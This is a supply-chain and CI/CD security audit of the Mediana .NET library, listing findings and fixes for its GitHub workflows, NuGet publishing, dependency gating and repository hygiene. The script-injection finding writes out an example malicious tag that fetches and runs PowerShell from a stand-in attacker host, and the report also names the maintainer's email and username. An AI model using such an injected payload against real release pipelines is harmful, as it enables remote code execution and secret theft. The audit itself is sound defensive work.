# Mediana — Supply Chain, CI/CD & Repo Hygiene Audit

Audit date: 2026-09-02  ·  Repo HEAD: `5be92c5`  ·  Auditor scope: `.github/**`, `Directory.*.props/targets`, `Directory.Packages.props`, `global.json`, `dotnet-tools.json`, `scripts/**`, `SECURITY.md`, `docs/release.md`, `docs/maintenance.md`, `CONTRIBUTING.md`, `.gitignore`, `artifacts/**`, `tests/**/TestResults`, `g.pack.binlog`, `src/Mediana/Dispa`, git history.

All findings verified against current tree (read-only). No project files modified.

---

## Findings

### [Critical] CI dependency-audit gate is vacuous — cannot fail

**Location:** `.github/workflows/ci.yml:105-121`

**Description.** The job body is:

```yaml
- name: Audit core packages
  run: |
    for p in Mediana.Abstractions Mediana Mediana.Transport.Abstractions Mediana.Outbox; do
      echo "Auditing $p"
      dotnet list src/$p/$p.csproj package --include-transitive 2>/dev/null \
        | grep -E "^\s+>" | grep -viE "microsoft|system\.|analyzers" \
        && { echo "NON-MICROSOFT DEPENDENCY IN CORE: $p"; exit 1; } || true
    done
```

Three compounding defects, verified locally:

1. **No `dotnet restore` before `dotnet list package`.** On a fresh checkout `project.assets.json` does not exist and `dotnet list package` fails with a non-zero exit and a message on stderr. `2>/dev/null` masks the stderr; stdout is empty; `grep` sees empty input and returns 1 (no match); the `... && { ... exit 1; }` branch is not taken; `|| true` recovers the pipeline exit. The step passes green while checking nothing. Reproduced by running the exact command on a machine where restore had not yet run for the target project: no output, exit 0.
2. **`2>/dev/null || true` idiom** — even if a real non-Microsoft package is added, any transient restore failure or feed outage would silently pass.
3. **Grep filter is loose.** `grep -viE "microsoft|system\.|analyzers"` excludes anything containing `system.` (dot literal), `microsoft` or `analyzers` (case-insensitive) as a substring. A future package named `SomeVendor.Microsoft.Bridge` or `MyCorp.Analyzers.X` would be treated as OK.

**Impact.** The claim in `README.md:134` "The core has zero third-party (non-Microsoft) dependencies — the dependency audit is enforced in CI" is not enforced. A future PR could add an arbitrary transitive non-Microsoft dep to the core packages and the D14 gate would not detect it. Also — CI never runs `dotnet list package --vulnerable` (per `docs/maintenance.md:47` it is manual monthly). Vulnerable dependencies can be merged without a CI signal.

**Recommendation.**

```yaml
- name: Restore
  run: dotnet restore Mediana.slnx
- name: Vulnerability audit (top-level + transitive)
  shell: bash
  run: |
    set -euo pipefail
    out=$(dotnet list Mediana.slnx package --vulnerable --include-transitive 2>&1)
    echo "$out"
    if echo "$out" | grep -qE '>\s*[^\s]+\s+[0-9]'; then
      echo "::error::Vulnerable packages found"; exit 1
    fi
- name: D14 core-purity gate (no non-Microsoft deps)
  shell: bash
  run: |
    set -euo pipefail
    ALLOW='^(Microsoft\.|System\.|NETStandard\.Library$)'
    fail=0
    for p in Mediana.Abstractions Mediana Mediana.Transport.Abstractions Mediana.Outbox; do
      offenders=$(dotnet list src/$p/$p.csproj package --include-transitive \
        | awk '/^ *> /{print $2}' | sort -u | grep -Ev "$ALLOW" || true)
      if [ -n "$offenders" ]; then
        echo "::error::Non-Microsoft dependency in $p:"; echo "$offenders"; fail=1
      fi
    done
    [ $fail -eq 0 ]
```

Also enable **NuGetAudit warnings as build errors** so `dotnet build` itself fails on advisories (see next finding).

---

### [High] No `permissions:` block in either workflow — `GITHUB_TOKEN` defaults to broad scope

**Location:** `.github/workflows/ci.yml:1-16`, `.github/workflows/release.yml:1-11`

**Description.** Neither workflow declares top-level or per-job `permissions:`. `GITHUB_TOKEN` defaults depend on org/repo Actions settings; the safe posture is explicit least privilege. `release.yml` uses `softprops/action-gh-release` which needs `contents: write` — otherwise everything is read.

**Impact.** A compromised third-party action or a script-injection payload (see next finding) can push commits, delete releases, modify wiki, or exhaust API rate limits depending on org defaults.

**Recommendation.**

```yaml
# ci.yml (top-level)
permissions:
  contents: read

# release.yml
permissions:
  contents: read           # default for all jobs
jobs:
  publish-nuget:
    permissions:
      contents: read
      id-token: write      # for NuGet.org Trusted Publishing (OIDC)
  github-release:
    permissions:
      contents: write      # only this job creates the release
      # add attestations: write if you enable attest-build-provenance
```

Also update `docs/release.md:31` — with explicit workflow permissions the maintainer no longer needs to set repo-wide read/write.

---

### [High] Script injection in `release.yml` via `${{ github.ref_name }}` interpolated into PowerShell

**Location:** `.github/workflows/release.yml:66`, `:73`

**Description.** The tag name is spliced verbatim into the pwsh source before the shell parses it:

```powershell
$tag = "${{ github.ref_name }}"
...
$v = "${{ steps.ver.outputs.version }}"
```

Git ref-name rules (git-check-ref-format) forbid `~ ^ : ? * [ \ ..` and whitespace, but allow the shell / PowerShell metacharacters `"`, backtick, `$`, `(`, `)`, `;`, `&`, `|`. A tag such as

    v1.0.0";$(iwr http://attacker/x.ps1|iex);"

pushed by anyone with the `contents: write` scope would execute arbitrary PowerShell inside the release runner with access to `GITHUB_TOKEN` and (in the pack job) subsequent artifacts. Line `:73` reuses `steps.ver.outputs.version` which is itself derived from the same tainted `ref_name`, propagating the injection.

**Impact.** RCE on the release runner → tampering with published nupkg files, exfiltrating `NUGET_API_KEY` from the `nuget` environment (if the job runs in it), poisoning artifacts before upload.

**Recommendation.** Route the input through `env:` so the shell only sees a variable name:

```yaml
- name: Extract version from tag
  id: ver
  shell: pwsh
  env:
    REF_NAME: ${{ github.ref_name }}
  run: |
    $tag = $env:REF_NAME
    if ($tag -notmatch '^v\d+\.\d+\.\d+(-[0-9A-Za-z.-]+)?$') {
      Write-Error "Invalid tag format: $tag"; exit 1
    }
    $version = $tag.TrimStart('v')
    "version=$version"    >> $env:GITHUB_OUTPUT
    "prerelease=$($version.Contains('-'))" >> $env:GITHUB_OUTPUT
```

Do the same anywhere else `github.*` or `steps.*.outputs.*` derived from user data appears in a `run:` block.

---

### [High] NuGet publishing uses long-lived `NUGET_API_KEY` instead of Trusted Publishing (OIDC)

**Location:** `.github/workflows/release.yml:117`, `:128-137`

**Description.** The publish step relies on a long-lived nuget.org API key stored as `secrets.NUGET_API_KEY`. NuGet.org shipped **Trusted Publishing** (OIDC federated identity) for GitHub Actions in 2025 (GA 2026); as of the audit date it is a supported option and eliminates the long-lived credential.

**Impact.** API key theft (via CI compromise, action supply-chain attack, environment secret leak) allows package hijacking. Keys tend to be over-scoped and to outlive their intended lifetime.

**Recommendation.**

1. Enable Trusted Publishing on nuget.org for the `Mediana*` prefix bound to `artemfomin/Mediana` repo + `nuget` environment.
2. Replace the push step with the OIDC flow (`NuGet/login`-style token exchange + `dotnet nuget push --api-key <short-lived>`), request `id-token: write` (see permissions finding).
3. Keep the `environment: nuget` — add "required reviewers" so tag pushes require an approval before publish.
4. If retaining an API key temporarily: scope it to `Mediana.*` glob only, set 90-day expiry, rotate on each maintainer change.

---

### [High] Third-party action `softprops/action-gh-release@v2` pinned by mutable tag

**Location:** `.github/workflows/release.yml:156`

**Description.** `v2` is a moving tag. The action author (or a compromised account) can retag `v2` to a malicious commit at any time; on the next release your workflow runs that commit with `contents: write` + access to already-built nupkg artifacts (potential replacement before GH Release upload).

**Impact.** Full compromise of the release pipeline via one third-party dependency.

**Recommendation.** Pin all third-party actions by immutable commit SHA + comment with the semantic version:

```yaml
uses: softprops/action-gh-release@<40-char-SHA>  # v2.x.y
```

Enable Dependabot for actions (already on — `.github/dependabot.yml:21-25`) — it opens PRs with SHA updates when set to SHA pinning.

Also consider replacing with `gh release create` via `gh` CLI (built into the runner) to remove the dependency entirely; the release body / artifact upload is trivial.

---

### [Medium] All GitHub Actions pinned by tag, not commit SHA

**Location:** `.github/workflows/ci.yml:21,22,47,48,77,90,91,100,109,110,127,128`; `.github/workflows/release.yml:16,17,44,45,58,59,108,119,123,145,151,156`

**Description.** Every action is tag-pinned (`@v4` or `@v2`). Even first-party (`actions/*`) actions have historically had tag-remap incidents. OpenSSF Scorecard flags this as `Pinned-Dependencies`.

Actions used and recommended posture:

| Action | Current pin | Recommendation |
|---|---|---|
| `actions/checkout` | `@v4` | Pin `@<sha> # v4.2.x` |
| `actions/setup-dotnet` | `@v4` | Pin `@<sha> # v4.x` |
| `actions/upload-artifact` | `@v4` | Pin `@<sha> # v4.x` |
| `actions/download-artifact` | `@v4` | Pin `@<sha> # v4.x` |
| `softprops/action-gh-release` | `@v2` | Replace or SHA-pin — see previous finding |

**Recommendation.** Use `pinact` / `sethvargo/ratchet` locally to convert once, then let Dependabot maintain them. Add to CONTRIBUTING that new actions must be SHA-pinned.

---

### [Medium] `NuGetAudit` / `NuGetAuditMode` / `NuGetAuditLevel` not declared explicitly

**Location:** `Directory.Build.props`, `Directory.Build.targets`, `Directory.Packages.props`

**Description.** With SDK 10.0.302 the defaults are `NuGetAudit=true`, `NuGetAuditMode=all` (since 9.0.100), `NuGetAuditLevel=low`. These defaults happen to be correct — but nothing in the repo asserts them, and a future property override in a child project (`NuGetAudit=false`) would silently disable the audit locally. Also, `TreatWarningsAsErrors=true` combined with NuGetAudit warnings (NU1901–NU1904) currently means vulnerable transitive packages will fail `dotnet build` — this is a strong signal that should be documented so future maintainers do not weaken it.

Verified: `dotnet list Mediana.slnx package --vulnerable --include-transitive` (SDK 10.0.302) reports 0 vulnerable packages across all 21 projects. Full output at bottom.

**Recommendation.**

```xml
<!-- Directory.Build.props -->
<PropertyGroup>
  <NuGetAudit>true</NuGetAudit>
  <NuGetAuditMode>all</NuGetAuditMode>
  <NuGetAuditLevel>low</NuGetAuditLevel>
  <!-- NU1900 = audit source unavailable (offline builds); keep as warning -->
  <MSBuildWarningsNotAsErrors>$(MSBuildWarningsNotAsErrors);NU1900</MSBuildWarningsNotAsErrors>
</PropertyGroup>
```

Also add the vulnerability audit as an explicit CI step (see Critical finding remediation).

---

### [Medium] No `packages.lock.json` and no `nuget.config`

**Location:** repo root (both files absent)

**Description.** Central Package Management is enabled but no lock file is used, so restore is not fully reproducible across CI runs (transitive graph can shift when new versions of transitives are published). Also no `nuget.config` — restore inherits the host's user-level config; a compromised or misconfigured runner (or contributor local env) could pull from an untrusted feed. No package source mapping means dependency confusion attacks are theoretically possible against `Mediana.*` if a squatter registers a lookalike on another feed the user has configured.

**Impact.** Reproducibility gap + weak defence against dependency confusion for consumers of source builds and CI itself.

**Recommendation.**

```xml
<!-- Directory.Build.props -->
<PropertyGroup>
  <RestorePackagesWithLockFile>true</RestorePackagesWithLockFile>
  <RestoreLockedMode Condition="'$(CI)' == 'true'">true</RestoreLockedMode>
</PropertyGroup>
```

Commit `packages.lock.json` per project. Add repo-scoped `nuget.config`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <packageSources>
    <clear />
    <add key="nuget.org" value="https://api.nuget.org/v3/index.json" protocolVersion="3" />
  </packageSources>
  <packageSourceMapping>
    <packageSource key="nuget.org">
      <package pattern="*" />
    </packageSource>
  </packageSourceMapping>
</configuration>
```

---

### [Medium] Integration tests hidden by `continue-on-error: true`

**Location:** `.github/workflows/ci.yml:39-41`

**Description.** `dotnet test tests/Mediana.IntegrationTests` runs with `continue-on-error: true` (comment refs `docs/QUESTIONS.md Q1`). The IntegrationTests project has zero tests (per shared context). So the flag currently hides nothing — but on the day someone adds real Testcontainer tests, failures will silently pass CI.

**Impact.** Security-relevant integration failures (broker auth, TLS misconfig, DLQ path) can regress unnoticed.

**Recommendation.** Either delete the empty project, or when tests are added:

```yaml
- name: Integration tests (Testcontainers)
  run: dotnet test tests/Mediana.IntegrationTests -c Release --no-build
  # No continue-on-error — Docker availability handled by [SkippableFact] / Testcontainers gating.
```

Gate on Docker availability inside the test (`Testcontainers` auto-skips if daemon not present), not at the workflow level.

---

### [Medium] `publish-nuget` silently succeeds when `NUGET_API_KEY` is unset

**Location:** `.github/workflows/release.yml:131-134`

**Description.** If the secret is empty the step logs a warning and `exit 0`. Combined with `github-release` running in parallel (`needs: [verify, pack]`, not `needs: publish-nuget`), a mis-tagged release can create a public GitHub Release announcing packages that were never pushed to NuGet.

**Impact.** User confusion, potentially publishing a release note claiming packages are available when they are not.

**Recommendation.** Fail loudly, and require `publish-nuget` to succeed before `github-release` runs:

```yaml
- name: Push nupkg + snupkg
  env:
    NUGET_API_KEY: ${{ secrets.NUGET_API_KEY }}
  shell: pwsh
  run: |
    if ([string]::IsNullOrEmpty($env:NUGET_API_KEY)) {
      Write-Error "NUGET_API_KEY not configured for environment 'nuget'"; exit 1
    }
    ...

github-release:
  needs: [verify, pack, publish-nuget]
```

(With Trusted Publishing this whole check disappears.)

---

### [Medium] No build provenance / attestation on published artifacts

**Location:** `.github/workflows/release.yml` (entire file — no `actions/attest-build-provenance` usage)

**Description.** Published nupkg / snupkg have no SLSA provenance attestation and no NuGet author signing certificate. Downstream consumers cannot verify a package was produced by this repo's release pipeline.

**Impact.** Package tampering after publish (or by a compromised publish credential) cannot be detected by consumers.

**Recommendation.** After `pack`, before `publish-nuget`:

```yaml
- uses: actions/attest-build-provenance@<sha> # v2
  with:
    subject-path: 'dist/*.nupkg'
# permissions: id-token: write, attestations: write, contents: read
```

Optional: enable NuGet author signing with a code-signing certificate (paid) — worth considering post-1.0 once the project has a Foundation or company backing.

---

### [Medium] Tracked `artifacts/*.nupkg` (12 files) — repo bloat, stale, no signature check

**Location:** `artifacts/Mediana*.nupkg` (12 tracked); snupkg equivalents present in tree but not tracked (per shared context — inconsistent)

**Description.** Prebuilt nupkg files are committed to git. Verified: the embedded `<repository commit="...">` in `artifacts/Mediana.1.0.0.nupkg` reads `f9bf08276980b45a3fc24988c76adc96139f8e14` (previous commit, one behind HEAD `5be92c5`). `Mediana.Generators.1.0.0.nupkg` embeds `e895b45e5600d1179d02806bf41bcc7d556153b7` — a different, older commit. So the tracked binaries are inconsistent with each other and with HEAD.

Additionally `Mediana.Generators.1.0.0.nupkg` contains `<description>Package Description</description>` — the SDK placeholder, not a real description. This will end up on NuGet.org search page if released as-is.

**Impact.** (a) Repo bloat and merge conflicts. (b) Consumers who download binaries from GitHub instead of NuGet get a version that does not correspond to any tag. (c) Placeholder description leaks unprofessional metadata to nuget.org.

**Recommendation.**

1. Delete `artifacts/*` from git (add to `.gitignore` — already ignored via `artifacts/` but the historical tracking overrides ignore).
2. Add `<Description>` to `src/Mediana.Generators/Mediana.Generators.csproj` (e.g. "Roslyn source generator for Mediana — reflection-free handler registration.").
3. If you want a browsable "latest preview" for reviewers, upload nupkg as a GitHub Release asset instead of committing.

---

### [Medium] Tracked TestResults coverage files leak absolute build paths

**Location:** 5 tracked files:

- `tests/Mediana.ContractTests.Ns21/TestResults/4b23d16d-.../coverage.cobertura.xml`
- `tests/Mediana.UnitTests.Ns21/TestResults/03f40e17-.../coverage.cobertura.xml`
- `tests/Mediana.UnitTests.Ns21/TestResults/03f40e17-.../coverage.json`
- `tests/Mediana.UnitTests/TestResults/9144d913-.../coverage.cobertura.xml`
- `tests/Mediana.UnitTests/TestResults/9144d913-.../coverage.json`

**Description.** All contain absolute paths of the form `F:\Projects\Mediana\src\...` and `F:/Projects/Mediana/src/`. No Windows username is leaked (project lives on `F:\Projects`, not under `C:\Users\...`) — checked. Also checked git history for `C:\Users\` and email leaks: git author metadata contains `Artem Fomin <terra.integer@gmail.com>` and `ZCode <zcode@local>` (expected, cannot be undone without history rewrite); no other emails; no `C:\Users\` in tracked file contents. The leak is limited to the maintainer project root, but is unnecessary noise in the public repo.

**Impact.** Low — path disclosure of the maintainer build machine layout. Cosmetic.

**Recommendation.** `git rm --cached tests/**/TestResults` and rely on `.gitignore` (`TestResults/` already present but overridden by historical tracking). CI can upload coverage as artifacts if archival is wanted.

---

### [Medium] `SECURITY.md` — Russian-only, no email, no PVR link, no PGP, DM-only reporting channel

**Location:** `SECURITY.md:1-24`

**Description.**

1. Language mismatch with the rest of the public-facing material: `README.md`, `LICENSE`, `CHANGELOG.md` are English; `SECURITY.md`, `SUPPORT.md`, `CODE_OF_CONDUCT.md`, `CONTRIBUTING.md`, `docs/**`, issue templates are Russian. A non-Russian reporter cannot follow the security-report flow.
2. Reporting channel is "DM via GitHub profile" (`https://github.com/artemfomin`). GitHub does not have public 1:1 DMs; the only private mechanism against a user profile is following-based email or completely off-platform contact.
3. No dedicated security email.
4. No link to GitHub Private Vulnerability Reporting (PVR) advisory form.
5. No PGP key / no encrypted channel for exploit details.
6. SLA (72h response / 7d assessment) reasonable but should be aligned with CVSS-based prioritization.

**Impact.** Reporters may drop the disclosure or file a public issue because the private channel is unclear.

**Recommendation.** Rewrite in English (or bilingual), enable PVR under Repo Settings -> Security -> Enable private vulnerability reporting, and point to it:

```markdown
# Security Policy

## Supported Versions
| Version | Status         |
|---------|----------------|
| 1.0.x   | Active support |
| < 1.0   | Not supported  |

## Reporting a Vulnerability
Please do NOT open a public issue for security reports.

Preferred: file a private advisory via GitHub —
https://github.com/artemfomin/Mediana/security/advisories/new

Alternative: email <security@...> (PGP key: <fingerprint>, https://.../pgp.asc).

SLAs (best-effort, single maintainer):
- First response: 3 business days
- Triage & CVSS: 7 days
- Fix + coordinated disclosure: aligned with severity (Critical <= 14d, High <= 30d, else 90d)

Scope: all `Mediana.*` NuGet packages published from this repository, including
transitive dependencies where Mediana chooses the version.

Out of scope: consumer application misconfiguration of brokers/DBs, generic DoS
without a Mediana-specific vector, issues in unmodified upstream libraries.
```

Also add `.github/SECURITY.md` (or keep at root) so GitHub surfaces the "Report a vulnerability" button.

---

### [Medium] `CODE_OF_CONDUCT.md` contact — same DM-via-profile issue

**Location:** `CODE_OF_CONDUCT.md:19-21`

**Description.** "Contact via GitHub profile with CoC tag" — same DM ambiguity as SECURITY.md.

**Recommendation.** Add a real email (`conduct@...` or a shared inbox) and clarify confidentiality guarantees. Aligned Contributor Covenant 2.1 template requires an actual contact method.

---

### [Medium] `Mediana.Generators` nuspec ships placeholder description; main package does not auto-install generator

**Location:** `artifacts/Mediana.Generators.1.0.0.nupkg` (nuspec metadata); `artifacts/Mediana.1.0.0.nupkg` (dependency graph)

**Description.** Verified by unzipping both nupkg from `artifacts/`:

- `Mediana.Generators.nuspec` has `<description>Package Description</description>` — the SDK stock placeholder.
- `Mediana.nuspec` `<dependencies>` for both TFMs contains only `Mediana.Abstractions`, `Microsoft.Extensions.DependencyInjection.Abstractions`, `Microsoft.Extensions.Logging.Abstractions` (net10 adds `System.Diagnostics.DiagnosticSource`). The generator is not a transitive dependency. README quick-start says `dotnet add package Mediana && Mediana.Generators` — this is correct but easy to miss. Also, without the generator (or `AddHandlersFromAssembly`), `AddMediana()` produces a working but empty registry — subtle UX and, in a hardened AOT context, silent no-op dispatch is a footgun.
- Additionally, `Mediana.Generators.nupkg` contains both `lib/netstandard2.0/Mediana.Generators.dll` and `analyzers/dotnet/cs/Mediana.Generators.dll`. `developmentDependency=true` prevents the lib copy from becoming a runtime dependency, but it inflates the package and can confuse tools that scan `lib/`.

**Impact.** Metadata quality (placeholder description on nuget.org search); consumer footgun (missing analyzer -> empty registrar -> silent no-op on `Send` for unregistered types).

**Recommendation.**

1. Set a real `<Description>` in `src/Mediana.Generators/Mediana.Generators.csproj`.
2. Ensure the lib/ output is excluded from the pack: add `<IncludeBuildOutput>false</IncludeBuildOutput>` and `<SuppressDependenciesWhenPacking>true</SuppressDependenciesWhenPacking>`.
3. Consider making `Mediana` package depend on `Mediana.Generators` with `PrivateAssets="all"` so it flows as a generator to consumers automatically (trade-off: consumers who explicitly avoid generators must exclude it).
4. Alternatively, publish a `Mediana.Sdk` metapackage that references both.

---

### [Low] `src/Mediana/Dispa` — orphaned file, tracked, no extension

**Location:** `src/Mediana/Dispa` (8.2 KB)

**Description.** Verified: tracked in git (`git ls-files` returns it). Content is a pre-rename copy of `src/Mediana/Dispatch/RequestCallSites.cs` (diff shows `RequestHandlerDelegate` vs `HandlerDelegate`, `behaviorTypes` vs `middlewareTypes`, missing header comments). Because the file has no `.cs` extension, MSBuild does not compile it — it will not break the build — but it ships as source in the repo and via SourceLink references, and is confusing for readers/graders.

**Recommendation.** `git rm src/Mediana/Dispa`.

---

### [Low] `publish-nuget` uses `--skip-duplicate` without checkout — replay/idempotency note

**Location:** `.github/workflows/release.yml:113-138`

**Description.** `--skip-duplicate` is used for idempotency (retry a partially-failed release without erroring on already-uploaded packages). No issue by itself; combined with the empty-key silent success (see Medium finding), a tag replay could push some packages and then quietly skip the missing ones on retry. Also, this job has no `checkout` step — good (nothing to tamper with) — but the API-key masking depends entirely on GitHub not echoing `${{ secrets.NUGET_API_KEY }}` (which is standard behavior).

**Recommendation.** Keep `--skip-duplicate`. After moving to Trusted Publishing, add a final "verify pushed" step that queries the NuGet.org API for each expected `id + version`.

---

### [Low] `g.pack.binlog` in working tree leaks maintainer paths (untracked / ignored — no exposure yet, but be careful)

**Location:** `F:\Projects\Mediana\g.pack.binlog` (380 KB, ignored via `*.binlog` in `.gitignore`)

**Description.** Confirmed ignored (`git ls-files` does not include it). Scanned the decompressed binlog content — it contains hundreds of paths of the form `C:\Users\terra\.nuget\packages\...` and `C:\Users\terra\AppData\Local\...`. No credentials, no API keys, no connection strings, no emails found. Would only leak the Windows username `terra` if this file were attached to a GitHub issue or PR. Since it is ignored, it will not be committed accidentally.

**Recommendation.** Nothing to change in the repo. Add a note to `CONTRIBUTING.md` reminding maintainers to not attach `*.binlog` files to public issues without redacting `%USERPROFILE%`.

Similarly `aot.log` (contains a benign GitHub API 403 error response) is not tracked; no action needed.

---

### [Low] No CodeQL, no OpenSSF Scorecard, no `dotnet format` gate

**Location:** `.github/workflows/` (absent)

**Description.** For a security-conscious OSS release, low-cost hardening is missing:

- CodeQL — free for public repos, catches taint-flow bugs and known API misuse in C#.
- OpenSSF Scorecard — publishes a public score card, gives users a quick trust signal, and flags many of the findings above automatically (pinned deps, dangerous workflow permissions, branch protection).
- `dotnet format --verify-no-changes` — style consistency; also implicitly detects some editor auto-fixes drifting.

**Recommendation.** Add `.github/workflows/codeql.yml` (standard template), `.github/workflows/scorecard.yml` (with `id-token: write, security-events: write`), and one `dotnet format` step in the existing `build-test` job.

---

### [Info] README security-relevant claims that do not match code (accuracy, not security per se)

**Location:** `README.md`

1. `README.md:134` — "The core has zero third-party (non-Microsoft) dependencies — the dependency audit is enforced in CI." — audit is vacuous (see Critical finding). Zero-third-party claim is currently accurate but the CI enforcement claim is false until the audit is fixed.
2. `README.md:64` — "retry engine with backoff+jitter (our own, not Polly)" — per shared context (`Retry.cs:59`), jitter is only applied if `Random` is passed and it is never passed. Jitter is effectively off.
3. `README.md:66` — "Full OTLP telemetry: traces + metrics + logs in a single call; non-blocking log pipeline (bounded channels, drops are counted)" — per shared context, `MedianaTelemetry.cs:238` `AsyncLogBridge` forward action is an empty lambda; the log pipeline exists but forwards nothing.

**Impact.** OSS reputation / accuracy of pre-release claims. Not a supply-chain issue per se, but worth flagging as part of release readiness.

**Recommendation.** Either fix the code before v1.0.0 or soften the README wording to reflect current behavior.

---

### [Info] Deprecated `xunit` 2.9.3 used in test projects (v3 available)

**Location:** `Directory.Packages.props:33`

**Description.** `dotnet list Mediana.slnx package --deprecated` reports `xunit` 2.9.3 as `Legacy` with alternative `xunit.v3 >= 0.0.0` for all 6 test projects. Not shipped to consumers, low priority.

**Recommendation.** Track migration to xunit.v3 in a backlog item; not a release blocker.

---

### [Info] Assembly not strong-named; NuGet packages not author-signed

**Location:** `Directory.Build.targets`, `src/Mediana/Properties/AssemblyInfo.cs:3-6`

**Description.** No `SignAssembly` / `AssemblyOriginatorKeyFile`, `InternalsVisibleTo` is unsigned (per shared context). No NuGet author signing certificate. This is the OSS norm for a solo-maintained project and generally recommended (strong-naming adds maintenance burden with weak security benefit). Flagging so the choice is deliberate.

**Recommendation.** No change. Document the decision briefly in `CONTRIBUTING.md` so future PRs asking for strong-naming get a canned answer.

---

## `dotnet list --vulnerable` raw output (verified 2026-09-02, SDK 10.0.302)

```
$ dotnet list Mediana.slnx package --vulnerable --include-transitive
Determining projects to restore...
20 of 21 projects are up-to-date for restore.
The following sources were used:
   https://api.nuget.org/v3/index.json

The given project `Mediana.Benchmarks`               has no vulnerable packages given the current sources.
The given project `Mediana.Abstractions`             has no vulnerable packages given the current sources.
The given project `Mediana.Generators`               has no vulnerable packages given the current sources.
The given project `Mediana.Kafka`                    has no vulnerable packages given the current sources.
The given project `Mediana.MassTransit`              has no vulnerable packages given the current sources.
The given project `Mediana.MediatR`                  has no vulnerable packages given the current sources.
The given project `Mediana.Outbox.Dapper`            has no vulnerable packages given the current sources.
The given project `Mediana.Outbox.EFCore`            has no vulnerable packages given the current sources.
The given project `Mediana.Outbox.MongoDB`           has no vulnerable packages given the current sources.
The given project `Mediana.Outbox`                   has no vulnerable packages given the current sources.
The given project `Mediana.RabbitMQ`                 has no vulnerable packages given the current sources.
The given project `Mediana.Telemetry.OpenTelemetry`  has no vulnerable packages given the current sources.
The given project `Mediana.Transport.Abstractions`   has no vulnerable packages given the current sources.
The given project `Mediana`                          has no vulnerable packages given the current sources.
The given project `Mediana.AotTests`                 has no vulnerable packages given the current sources.
The given project `Mediana.ContractTests.Ns21`       has no vulnerable packages given the current sources.
The given project `Mediana.GeneratorTests`           has no vulnerable packages given the current sources.
The given project `Mediana.IntegrationTests`         has no vulnerable packages given the current sources.
The given project `Mediana.InteropTests`             has no vulnerable packages given the current sources.
The given project `Mediana.UnitTests.Ns21`           has no vulnerable packages given the current sources.
The given project `Mediana.UnitTests`                has no vulnerable packages given the current sources.
```

`--deprecated` — only `xunit 2.9.3` in test projects (see Info finding above). `--outdated` — only `Microsoft.SourceLink.GitHub 8.0.0 -> 10.0.400` across all packable projects, `MassTransit 8.5.10 -> 9.2.1` on `Mediana.MassTransit` ns2.1 asset (intentional per D13), `Npgsql 10.0.0 -> 10.0.3` in `IntegrationTests`.

Git-history secret/PII scan (29 commits, `git log --all -p`): 0 credentials, 0 API keys, 0 private keys, 0 connection strings, 0 non-author emails. Author identities present in history metadata: `Artem Fomin <terra.integer@gmail.com>`, `ZCode <zcode@local>` (both become public via `git log` — expected).

---

## Summary Table

| ID    | Severity | Title |
|-------|----------|-------|
| SC-01 | Critical | CI dependency-audit gate is vacuous — cannot fail |
| SC-02 | High     | No permissions block in either workflow |
| SC-03 | High     | Script injection in release.yml via github.ref_name in pwsh |
| SC-04 | High     | NuGet publish uses long-lived NUGET_API_KEY (no Trusted Publishing) |
| SC-05 | High     | Third-party softprops/action-gh-release@v2 pinned by mutable tag |
| SC-06 | Medium   | All actions pinned by tag, not commit SHA |
| SC-07 | Medium   | NuGetAudit* properties not declared explicitly |
| SC-08 | Medium   | No packages.lock.json and no nuget.config (source mapping) |
| SC-09 | Medium   | Integration tests hidden by continue-on-error: true |
| SC-10 | Medium   | publish-nuget silently succeeds on empty NUGET_API_KEY |
| SC-11 | Medium   | No build provenance / attestation on published artifacts |
| SC-12 | Medium   | Tracked artifacts/*.nupkg — bloat, stale, inconsistent commit hashes |
| SC-13 | Medium   | Tracked TestResults coverage files leak absolute build paths |
| SC-14 | Medium   | SECURITY.md: Russian-only, no email, no PVR link, no PGP |
| SC-15 | Medium   | CODE_OF_CONDUCT.md contact ambiguous (DM via profile) |
| SC-16 | Medium   | Mediana.Generators nuspec has placeholder description; not auto-referenced |
| SC-17 | Low      | src/Mediana/Dispa orphaned tracked file |
| SC-18 | Low      | publish-nuget --skip-duplicate + no post-verify (with silent-success caveat) |
| SC-19 | Low      | g.pack.binlog in working tree leaks C:\Users\terra\... (ignored — do not attach) |
| SC-20 | Low      | No CodeQL, no OpenSSF Scorecard, no dotnet format gate |
| SC-21 | Info     | README security-relevant claims vs reality (D14 CI, jitter, OTLP logs) |
| SC-22 | Info     | Deprecated xunit 2.9.3 in tests |
| SC-23 | Info     | No assembly strong-naming / no NuGet author signing (OSS norm — deliberate?) |

---

## Checked & OK

- Solution builds with TreatWarningsAsErrors=true, Deterministic=true, EnableAotAnalyzer=true — good defaults (Directory.Build.props:6-12).
- ContinuousIntegrationBuild set to true when $(CI)==true — deterministic PDBs on CI (Directory.Build.targets:18).
- SourceLink enabled with PrivateAssets=All — build-time only, does not leak to consumers (Directory.Build.targets:26).
- EmbedUntrackedSources=true, IncludeSymbols=true, SymbolPackageFormat=snupkg — good symbol-server posture (Directory.Build.targets:15-17).
- Icon and readme embedded in packages, verified by unzip inspection: icon.png + package-readme.md present in every packable nupkg; license type=expression MIT correct (verified in Mediana.nuspec).
- Central Package Management enabled (Directory.Packages.props:3) — consistent versions across all projects.
- .gitignore covers bin/ obj/ artifacts/ dist/ *.log *.binlog StrykerOutput/ BenchmarkDotNet.Artifacts/ TestResults/ coverage*.json coverage*.xml .vs/ .idea/ — comprehensive.
- Dependabot config sane: NuGet + github-actions weekly, grouped sensibly (.github/dependabot.yml).
- Issue templates: security link surfaces on new-issue page (ISSUE_TEMPLATE/config.yml:3-5), blank_issues_enabled: false forces triage.
- FUNDING.yml minimal and clean (only buymeacoffee: chanter), no PII, no untrusted URLs.
- CI concurrency with cancel-in-progress: true prevents duplicate spend (ci.yml:8-10). Correctly not applied to release.yml (release runs must not cancel each other).
- Release pipeline enforces verify + aot before pack, and pack before publish / github-release — good gating.
- publish-nuget uses environment: nuget — supports required reviewers for manual approval (need to configure in repo settings — mentioned in docs/release.md:30).
- Package metadata verification step (release.yml:84-106) actively checks license expression + projectUrl + embedded icon + embedded readme — good.
- dotnet list --vulnerable returns zero across all 21 projects on SDK 10.0.302.
- No secrets, API keys, private keys, connection strings, or non-author emails found in git history (29 commits scanned) or working tree source.
- pull_request trigger (not pull_request_target) — forks cannot access repo secrets during CI. Good default.
- Coverage cobertura files use forward-slash F:/Projects/... (no username), coverage.json uses F:\Projects\... (no username). No C:\Users\<name>\ leaked in any tracked file.
- CONTRIBUTING.md provides reproducible local gate commands matching CI.
- SUPPORT.md clearly states supported runtimes and lifecycle policy.
